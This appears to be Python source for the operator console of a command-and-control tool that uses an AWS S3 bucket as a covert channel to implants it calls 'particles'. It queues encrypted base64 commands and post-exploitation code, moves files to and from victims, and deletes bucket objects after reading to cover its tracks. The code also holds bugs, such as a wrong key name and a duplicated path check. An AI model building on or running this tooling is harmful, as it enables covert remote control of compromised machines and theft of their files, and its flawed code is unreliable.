import base64
import os
import sys
import time

import boto3
import requests
from termcolor import colored

def checkBucket(bucketname):
    statuscode = requests.get(f"https://{bucketname}.s3.amazonaws.com").status_code
    if statuscode == 200 or statuscode == 403:
        return True
    return False

def getparticlelist(profile, bucket_name, particles):
    try:
        s3Client = boto3.Session(profile_name=profile).client("s3")
        bucketObjectsReq = s3Client.list_objects_v2(Bucket=bucket_name)
        if 'Contents' in bucketObjectsReq:
            bucketObjects = bucketObjectsReq['Contents']
            for key in bucketObjects:
                if key['key'][-1] == "/":
                    if not key['key'][-1] in particles:
                        particles.append(key['key'][-1])
    except Exception as e:
        print(
            colored(
                f"[*] Error: {sys.exc_info()[1]}", "red"
            )
        )

def findFileName(filePath):
    if '/' in filePath:
        return filePath.split('/')[-1]
    elif '/' in filePath:
        return filePath.split('\\')[-1]
    else:
        return filePath

def uploadFile(bucket_name, particle_name, sourceFile, s3Client, kmskeyid):
    fileName = findFileName(sourceFile)

    with open(sourceFile, 'rb') as sourceFileObj:
        s3Client.put_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{fileName}",
            Body=base64.b64encode(sourceFileObj.read()),
            SSEKMSKeyId=kmskeyid,
            ServerSideEncryption='aws:kms',
            ContentType="text/plain"
        )
    sourceFileObj.close()
    """s3Client.delete_object(
        Bucket=bucket_name,
        Key=f"{particle_name}/{fileName}",
        # SSEKMSKeyId=kmskeyid,
        # ServerSideEncryption ='aws:kms'
    )"""

def downloadFile(bucket_name, particle_name, sourcePath, destinationPath, s3Client):
    fileName = findFileName(sourcePath)

    with open(destinationPath, 'wb') as destinationPathObj:
        destinationPathObj.write(
            s3Client.get_object(
                Bucket=bucket_name,
                Key=f"{particle_name}/{fileName}",
                # SSEKMSKeyId=kmskeyid,
                # ServerSideEncryption ='aws:kms'
            )['Body'].read()
        )
    destinationPathObj.close()

    s3Client.delete_object(
        Bucket=bucket_name,
        Key=f"{particle_name}/{fileName}",
        # SSEKMSKeyId=kmskeyid,
        # ServerSideEncryption ='aws:kms'
    )

def printOutput(bucket_name, particle_name, sourcePath, s3Client):
    fileName = findFileName(sourcePath)

    print(
        s3Client.get_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{fileName}",
            # SSEKMSKeyId=kmskeyid,
            # ServerSideEncryption ='aws:kms'
        )['Body'].read()
    )

    s3Client.delete_object(
        Bucket=bucket_name,
        Key=f"{particle_name}/{fileName}",
        # SSEKMSKeyId=kmskeyid,
        # ServerSideEncryption ='aws:kms'
    )

def getsendcommand(bucket_name, particle_name, command_key, output_key, command, s3Client, kmskeyid, particles):
    try:
        print("Previous command output: " + s3Client.get_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{output_key}",
            # SSEKMSKeyId=kmskeyid,
            # ServerSideEncryption ='aws:kms'
        )['Body'].read().decode())
    except:
        pass

    try:
        s3Client.delete_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{output_key}",
            # SSEKMSKeyId=kmskeyid,
            # ServerSideEncryption ='aws:kms'
        )

        s3Client.delete_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{command_key}",
            #SSEKMSKeyId=kmskeyid,
            #ServerSideEncryption ='aws:kms'
        )

        if len(command.split(" ")) == 2:
            if command.split(" ")[0] == 'postexploit':
                if not os.path.exists(command.split(" ")[1]):
                    print(colored(f"Error: File {command.split(' ')[1]} does not exist", "red"))
                else:
                    try:
                        with open(command.split(" ")[1], 'rb') as postexpfileobj:
                            command = f"{command.split(' ')[0]} {base64.b64encode(postexpfileobj.read()).decode()}"
                    except Exception as e:
                        print(str(e))
                        return

                    '''try:
                        uploadFile(
                            bucket_name=bucket_name,
                            kmskeyid=kmskeyid,
                            particle_name=particle_name,
                            sourceFile=command.split(" ")[1],
                            s3Client=s3Client
                        )
                    except Exception as e:
                        print(
                            colored(f"Error uploading go code: {str(e)}", "red")
                        )
                        return'''

        if len(command.split(" ")) == 3:
            if command.split(" ")[0] == 'upload':
                try:
                    uploadFile(
                        bucket_name=bucket_name,
                        kmskeyid=kmskeyid,
                        particle_name=particle_name,
                        sourceFile=command.split(" ")[1],
                        s3Client=s3Client
                    )
                except Exception as e:
                    print(
                        colored(f"Error uploading go code: {str(e)}", "red")
                    )
                    return

        s3Client.put_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{command_key}",
            Body=base64.b64encode(command.encode()),
            SSEKMSKeyId = kmskeyid,
            ServerSideEncryption ='aws:kms',
            ContentType="text/plain"
        )

        print(
            colored(
                f"[*] Uploaded command to bucket", "green"
            )
        )
    except Exception as e:
        print(
            colored(f"Error uploading the command: {str(e)}")
        )

    testparticle = 0
    postexploittest = 0

    if command.split(" ")[0] == 'postexploit':
        print(
            colored(
                f"[*] Printing output of code {command.split(' ')[1]}...", "yellow"
            )
        )
    elif command.split(" ")[0] == 'download':
        print(
            colored(
                f"[*] Downloading file {command.split(' ')[1]} to {command.split(' ')[2]}...", "yellow"
            )
        )
    elif command.split(" ")[0] == 'upload':
        print(
            colored(
                f"[*] Uploading file {command.split(' ')[1]} to {command.split(' ')[2]}...", "yellow"
            )
        )

    while True:
        try:
            '''if len(command.split(" ")) == 2:
                if command.split(" ")[0] == 'postexploit':
                    time.sleep(5)
                    while postexploittest <= 60:
                        try:
                            printOutput(
                                bucket_name=bucket_name,
                                particle_name=particle_name,
                                sourcePath=f"{command.split(' ')[1]}.output",
                                s3Client=s3Client
                            )

                        except Exception as e:
                            print(str(e))
                            postexploittest += 5
                            time.sleep(5)'''


            if len(command.split(" ")) == 3:
                if command.split(" ")[0] == 'download':
                    downloadFile(
                        bucket_name=bucket_name,
                        particle_name=particle_name,
                        sourcePath=command.split(" ")[1],
                        destinationPath=command.split(" ")[2],
                        s3Client=s3Client
                    )

                    print(
                        colored(
                            f"[*] Downloaded file {command.split(' ')[1]} to {command.split(' ')[2]}", "green"
                        )
                    )

                elif command.split(" ")[0] == 'upload':
                    uploadFile(
                        bucket_name=bucket_name,
                        particle_name=particle_name,
                        sourceFile=command.split(" ")[1],
                        s3Client=s3Client,
                        kmskeyid=kmskeyid
                    )

                    print(
                        colored(
                            f"[*] Uploaded file {command.split(' ')[1]} to {command.split(' ')[2]}", "green"
                        )
                    )

            print(s3Client.get_object(
                Bucket=bucket_name,
                Key=f"{particle_name}/{output_key}",
                # SSEKMSKeyId=kmskeyid,
                # ServerSideEncryption ='aws:kms'
            )['Body'].read().decode())

            s3Client.delete_object(
                Bucket=bucket_name,
                Key=f"{particle_name}/{output_key}",
                # SSEKMSKeyId=kmskeyid,
                # ServerSideEncryption ='aws:kms'
            )

            """s3Client.delete_object(
                Bucket=bucket_name,
                Key=f"{particle_name}/{command_key}",
                # SSEKMSKeyId=kmskeyid,
                # ServerSideEncryption ='aws:kms'
            )"""

            break
        except Exception as e:
            time.sleep(5)
            testparticle += 5
            if testparticle == 60:
                deleteparticle(s3Client, particle_name, bucket_name, command_key, output_key, particles)
                particle_name = ""
                break
            pass

def deleteparticle(s3Client, particle_name, bucket_name, commandfile, outputfile, particles):
    print(colored(
        "The particle seems down. Deleting the bucket dir", "yellow"
    ))

    try:
        s3Client.delete_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{commandfile}"
        )
    except Exception as e:
        pass
    try:
        s3Client.delete_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/{outputfile}"
        )
    except Exception as e:
        pass

    try:
        s3Client.delete_object(
            Bucket=bucket_name,
            Key=f"{particle_name}/"
        )
    except Exception as e:
        pass

    for particlelist in particles:
        if particlelist['particle_key_name'] == particle_name:
            del (particles[particles.index(particlelist)])

    print(
        colored(
        "Particle Deleted", "green"
        )
    )

